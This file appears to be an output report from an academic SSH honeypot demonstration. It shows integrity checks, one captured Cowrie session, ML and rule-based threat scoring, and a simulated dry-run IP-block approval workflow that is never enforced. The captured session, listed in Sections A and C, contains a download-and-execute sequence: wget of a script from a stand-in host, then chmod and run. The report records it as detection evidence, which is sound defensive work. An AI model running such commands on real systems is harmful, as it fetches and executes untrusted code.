@@ -1,0 +1,132 @@
+PRE-FLIGHT VERIFICATION (saved evidence)
+  [PASS] top-level SHA256SUMS - 19/19 files match
+  [PASS] section SHA256SUMS assessment/20261112T072217Z-034f7b - 17/17 files match
+  [PASS] section SHA256SUMS assessment/20261112T073151Z-ba1005 - 22/22 files match
+  [PASS] section SHA256SUMS live/20261112T070531Z-670781 - 25/25 files match
+  [PASS] session ID identical in all 12 places (ML and rules branches) - 42ee73a7cbbd
+  [PASS] both branches consumed the same captured bytes - slice 50c0f94232e9d7b1 = rules-branch input 50c0f94232e9d7b1
+  [PASS] 29D run used the same captured bytes
+  [PASS] signed attribution: result_hash recomputes and Ed25519 signature verifies with the saved DEMO public key - DEMO-20261112T073151Z-ba1005 / 6d449820a76b143a
+  [PASS] assessment accepted exactly this signed result
+  [PASS] assessment audit chain verifies
+  [PASS] proposal_hash recomputes - 7b1c83073507a883
+  [PASS] proposal -> signed result ID and hash
+  [PASS] proposal -> assessment audit record hash
+  [PASS] approval_hash recomputes and names this proposal hash
+  [PASS] response/feedback audit chain and transitions verify - chain and transitions intact
+  [PASS] audit approval_recorded references this approval
+  [PASS] audit proposal_created references this proposal hash and signed result
+  [PASS] feedback core hash recomputes and is cited in the audit annotation
+  [PASS] feedback references match the audit (approval, simulated, verification, rollback)
+  [PASS] every response audit entry is dry_run mode
+  [PASS] all eight exclusions active (v2.0.0) - 8 IDs, digest 2a50f53f4a730641
+  [PASS] demonstration exception admits only 42ee73a7cbbd, only when named - 24/24 misuse attempts refused
+  [PASS] no firewall/relay/client command in any run (subprocesses: pipeline scripts, one read-only slice exec, assessment container) - 7 subprocesses
+  [PASS] no production config, private key, Cowrie log, Dataset V2 or sealed path opened by any run - []
+  [PASS] enforcement interface never called
+  [PASS] host firewall: no rule mentions 10.250.25.3/.4; no witness container (29F read-only check)
+  [PASS] novelty reference baseline contains no excluded session - 5 baseline sessions
+  [PASS] fresh session is not an evaluation input (novelty mode independent, 0 overlap; exclusion registered after the demo run)
+  28/28 checks passed
+
+==============================================================================
+ADAPTIVE ZERO-DAY HONEYPOT - ACADEMIC DEMONSTRATION      session 42ee73a7cbbd
+==============================================================================
+  Evidence: live/20261112T070531Z-670781 (ML branch)  |  assessment/20261112T073151Z-ba1005 (rules branch)
+  Two independent branches over the SAME captured session; novelty/DEC do NOT feed threat scoring.
+
+==============================================================================
+SECTION A - COWRIE INTERACTION                              [OBSERVED]
+==============================================================================
+  [OBSERVED]  Session ID                        42ee73a7cbbd
+  [OBSERVED]  Connection (Cowrie view)          172.22.0.2:50408 -> 172.22.0.1:2222  (relay address)
+  [OBSERVED]  Client version                    SSH-2.0-Twisted_25.5.0
+  [OBSERVED]  Login result                      SUCCESS user 'demo' at 2026-11-12T07:04:00.059688Z  (failed logins: 0)
+  [OBSERVED]  Command 1                         uname -a
+  [OBSERVED]  Command 2                         wget http://files.example/x.sh -O x.sh
+  [OBSERVED]  Command 3                         chmod +x x.sh
+  [OBSERVED]  Command 4                         ./x.sh
+  [OBSERVED]  Command 5                         exit
+  [OBSERVED]  Cowrie command.failed event       ./x.sh
+  [OBSERVED]  Session duration                  10.5 s (Cowrie)  /  10.600798 s (reconstructed)
+  [OBSERVED]  Events captured after baseline    14 (Cowrie log baseline 21,888 lines; rotated)
+
+==============================================================================
+SECTION B - BEHAVIOURAL ANALYSIS (ML branch)                [MODEL]
+==============================================================================
+  [MODEL]     Reconstructed session             5 commands, auth_success=1
+  [MODEL]     Feature table                     29 columns (behavior_features.csv)
+  [MODEL]     DEC model input                   17 features, 3 clusters (saved model, no refit)
+  [MODEL]     DEC assignment                    cluster 1  confidence 0.924
+  [MODEL]     Cluster probabilities             0.047 / 0.924 / 0.029
+  [MODEL]     Baseline signature                sig-4e22763125d03876  (cluster 1, 5 baseline sessions, confidence 0.8375)
+  [MODEL]     Novelty classification            Known-like  score 0.774  (known threshold 0.7)
+  [MODEL]     Closest signature                 sig-4e22763125d03876  (Mixed/Unclassified)
+
+==============================================================================
+SECTION C - THREAT SCORING & RULES (rules branch)           [DECISION]
+==============================================================================
+  [DECISION]  Behavioural evidence level        E2  (catalogue v2-evidence-1.1)
+  [OBSERVED]  Indicator SHELL-1 (context)       directly_observed: uname -a
+  [OBSERVED]  Indicator DISC-1 (context)        directly_observed: uname -a
+  [OBSERVED]  Indicator XFER-1 (action)         directly_observed: wget http://files.example/x.sh -O x.sh
+  [OBSERVED]  Indicator EXEC-1 (action)         inferred: chmod +x x.sh, ./x.sh
+  [OBSERVED]  Indicator EMU-1 (caveat)          emulator_dependent: -
+  [DECISION]  Finding                           download attempt: S2 / E2, success observed: False
+  [DECISION]  Finding                           download-and-execute attempt: S3 / E2, success observed: False
+  [DECISION]  Successful-login evidence         login_success_observed at 2026-11-12T07:04:00.059688Z (via signed result)
+  [VERIFIED]  Signed attribution                DEMO-20261112T073151Z-ba1005  signature VERIFIED (DEMO key aabbbc647a8b2e38)
+  [DECISION]  Verified attribution              attributable_via_proxy_mapping -> client 10.250.25.3:47200 (test_client)
+  [OBSERVED]  Relay connection                  93daae7d-64df-4314-bcc9-f42f74789d27
+  [DECISION]  Gate 1                            PASS  severity S2 or higher
+  [DECISION]  Gate 2                            PASS  interpretation E2 or higher on an S2plus finding
+  [DECISION]  Gate 3                            PASS  two distinct action indicators
+  [DECISION]  Gate 4                            PASS  successful login
+  [DECISION]  Gate 5                            PASS  attributable source
+  [DECISION]  Gate 6                            PASS  not protected or shared
+  [DECISION]  Gate 7                            PASS  verified configuration digests
+  [DECISION]  Gate 8                            PASS  no processing errors
+  [DECISION]  THREAT TIER                       PROPOSE - all proposal conditions met; manual approval required
+  [DECISION]  Proposal (recorded only)          block_source_ip 10.250.25.3, mode dry_run, approval pending, not_executed
+
+==============================================================================
+SECTION D - DYNAMIC RESPONSE                               [SIMULATED]
+==============================================================================
+  [VERIFIED]  Proposal                          prop-task26c-isolated-000001  hash 7b1c83073507a883... (recomputed: OK)
+  [VERIFIED]  Bound to signed result            DEMO-20261112T073151Z-ba1005
+  [DECISION]  Response action / target          restrict_new_connections on 10.250.25.3/32 (listener demo; from block_source_ip 10.250.25.3)
+  [DECISION]  Maximum duration                  900 s
+  [VERIFIED]  Refused approval                  duration 901 s (> 15 min): approved duration exceeds the proposal maximum
+  [VERIFIED]  Refused approval                  signed by an unregistered key: approval signature invalid
+  [VERIFIED]  Refused approval                  modified after signing (target -> control client): approval_hash mismatch (approval modified)
+  [VERIFIED]  Refused approval                  re-signed with a different target: approved target differs from the proposal
+  [VERIFIED]  Refused approval                  refers to an altered proposal hash: approval does not refer to this exact proposal
+  [VERIFIED]  Refused approval                  decision dated in the future: decision dated in the future
+  [SIMULATED] Approval                          approve by 'DEMO APPROVER (ephemeral)' key e8ac9dc6430f0301, rule TTL 600 s
+  [VERIFIED]  Approval verification             signature verified by the controller at run time (audit: approval_recorded); approval_hash recomputed now: OK
+  [SIMULATED] #1  proposal_created              -> proposed
+  [SIMULATED] #9  approval_recorded             -> approved
+  [SIMULATED] #12 simulated                     -> simulated
+  [SIMULATED] #14 verification_passed           -> verified_dry_run
+  [SIMULATED] #16 revoked                       -> revoked
+  [SIMULATED] #17 rollback_started              -> rollback_pending
+  [SIMULATED] #18 rollback_verified             -> rolled_back
+  [SIMULATED] #19 annotation_recorded           -> rolled_back
+  [SIMULATED] DRY-RUN status                    enforced=False: dry-run: no rule staged, relay not contacted
+  [SIMULATED] Operator verification             dry_run_confirmed_no_effect
+  [SIMULATED] Rollback                          rollback_verified
+  [VERIFIED]  Refused operations logged         11
+
+==============================================================================
+SECTION E - FEEDBACK                                        [SIMULATED]
+==============================================================================
+  [VERIFIED]  Feedback record                   feedback_record.json sha256 cea0f2739c80cf46...
+  [VERIFIED]  Feedback core hash                e794b3679d0b5cdb... (recomputed: OK)
+  [SIMULATED] Label                             true_positive by DEMO REVIEWER
+  [VERIFIED]  Audit verification                19 entries, chain and transitions intact, last faa3721337e9cb86...
+  [SIMULATED] Final response state              rolled_back (response_success=True)
+  [VERIFIED]  Enforcement interface calls       []
+
+==============================================================================
+  ACTUAL_BLOCKING: NOT_EXECUTED
+==============================================================================
